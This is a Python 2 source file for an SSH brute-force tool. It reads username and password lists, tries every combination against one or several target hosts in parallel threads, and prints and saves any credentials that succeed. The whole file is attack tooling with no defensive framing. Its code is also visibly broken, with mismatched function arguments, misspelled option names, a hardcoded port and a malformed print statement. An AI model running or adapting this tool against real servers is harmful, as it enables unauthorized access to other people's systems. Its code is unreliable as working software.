'''
Created on Aug 25, 2011

@author: wildicv
'''

import sys
from optparse import OptionParser

#Import the Util Class
import Util
#Import the connection class
from Connection import Connection

class SSHBruteForce():

    def __init__(self):
        self.info = "Simple SSH Brute Forcer: By Wildicv"
        self.targetIp = ""
        self.targetPort = 0
        self.targets = []
        self.usernames = []
        self.passwords = []
        self.connections  = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0
        self.timeoutTime = 0
        self.outputFileName = ""
        self.singleMode = False
        self.verbose = False
        
    def startUp(self):
        usage = '%s [-h targetIp] [-U UserNameList] [-P PasswordList] [-v]' % sys.argv[0]
        
        optionParser = OptionParser(version = self.info, usage = usage)

        optionParser.add_option('-i',  dest = 'targetIp',              
                                help = 'Ip to attack')  
        optionParser.add_option('-p',  dest = 'targetPort',            
                                help = 'Ip port to attack', default = 22)
        optionParser.add_option('-I',  dest = 'targetsFile',
                                help = 'List of IP\'s and ports')       
        optionParser.add_option('-U',  dest = 'usernamesFile',              
                                help = 'Username List file')  
        optionParser.add_option('-P',  dest = 'passwordsFile',          
                                help = 'Password List file')
        optionParser.add_option('-t',  type = 'int', dest = 'threads', 
                                help = 'Amount of Threads', default = 10)
        optionParser.add_option('-T',  type = 'int', dest = 'timeout', 
                                help = 'Timeout Time', default = 15)
        optionParser.add_option('-O', dest = "outputFile",
                                help = 'Output File Name')
        optionParser.add_option('-v',  '--verbose', action='store_true', 
                                dest='verbose', help='verbose')

        (options, args) = optionParser.parse_args()

        #First a check is used to see if there is at least a singleIp set or a targetList set
        if not options.targetIp and not options.targetsFile:            
            optionParser.print_help()
            sys.exit(1)
            
        else:
            #Then another check to make sure the Username list and passwordlist are filled
            if options.usernamesFile and options.passwordsFile:
                #Then we check if it is a single ip only
                if options.targetIp and not options.targetsFile:
                    self.singleTarget(options)
                    self.singleMode = True
                elif not options.targetIp and options.targetsFilet:
                    self.multipleTargets(options)
                else:
                    optionParser.print_help()
                    sys.exit(1)
            else:
                optionParser.print_help()
                sys.exit(1)
            
    def singleTarget(self,options):
            self.targetIp  = options.targetIp
            self.targetPort = options.targetPort
            self.usernames = Util.fileContentsToList(options.usernamesFile)
            self.passwords = Util.fileContentsToList(options.passwordsFile)
            self.amountOfThreads = options.threads
            self.timeoutTime = options.timeout
            self.outputFileName = options.ouputFile
            self.verbose = options.verbose
            self.showStartInfo()
            self.bruteForceSingle()
            
    def multipleTargets(self,options):    
            self.targets = Util.fileContentsToTuple(options.targetsFile)
            self.usernames = Util.fileContentsToList(options.usernamesFile)
            self.passwords = Util.fileContentsToList(options.passwordsFile)
            self.amountOfThreads = options.threads
            self.timeoutTime = options.timeout
            self.outputFileName = options.ouputFile
            self.verbose = options.verbose
            self.showStartInfo()
            self.bruteForceMultiple()
        
    def showStartInfo(self):
        print "[*] %s " % self.info
        if self.singleMode:
            print "[*] Brute Forcing %s "  % self.targetIp
        else:
            print "[*] Loaded %s Targets " % str(len(self.targets))
        print "[*] Loaded %s Usernames "   % str(len(self.usernames))
        print "[*] Loaded %s Passwords "   % str(len(self.passwords))
        print "[*] Brute Force Starting "
        
        if self.outputFileName != "":
            Util.appendLineToFile("%s " % self.info, self.outputFileName)
            if self.singleMode:
                Util.appendLineToFile("Brute Forcing %s "  % self.targetIp, self.outputFileName)
            else:
                Util.appendLineToFile("Loaded %s Targets " % str(len(self.targets)),  self.outputFileName)
            Util.appendLineToFile("Loaded %s Usernames "   % str(len(self.usernames)), self.outputFileName)
            Util.appendLineToFile("Loaded %s Passwords "   % str(len(self.passwords)), self.outputFileName)
            Util.appendLineToFile("Brute Force Starting ", self.outputFileName)

    def bruteForceSingle(self):
        for username in self.usernames:
            for password in self.passwords:
                self.createConnection(username, password, self.targetIp, 
                                      self.targetPort, self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
                    
    def bruteForceMultiple(self):
        for target in self.targets:
            for username in self.usernames:
                for password in self.passwords:
                    self.createConnection(username, password, target[0], 
                                          int(target[1]), self.timeoutTime)
                    if self.currentThreadCount == self.amountOfThreads:
                        self.currentThreadResults()
        
    def createConnection(self, username, password, targetIp):
        connection = Connection(username, password, targetIp, 22, self.timeoutTime)
        connection.start()
        self.connections.append(connection)
        self.currentThreadCount += 1
        if self.verbose:
            print "[*] Adding Target: %s, Testing with username: %s, testing with password: %s" % targetIp, username, password
        
    def currentThreadResults(self):
        for connection in self.connections:
            connection.join()
            if connection.status == 'Succeeded':
                print "[#] TargetIp: %s " % connection.targetIp
                print "[#] Username: %s " % connection.username
                print "[#] Password: %s " % connection.password
                
                if self.outputFileName != "":
                    Util.appendLineToFile("TargetIp: %s " % connection.targetIp, self.outputFileName)
                    Util.appendLineToFile("Username: %s " % connection.username, self.outputFileName)
                    Util.appendLineToFile("Password: %s " % connection.password, self.outputFileName)
                    
                if self.singleMode:
                    self.completed()
            else:
                pass
    
        self.clearOldThreads()

    def clearOldThreads(self):
        self.connections = []
        self.threadCount = 0
    
    def completed(self):
        print "[*] Completed Brute Force."
        sys.exit(0)
        
if __name__ == '__main__':
    sshBruteForce = SSHBruteForce()
    sshBruteForce.startUp()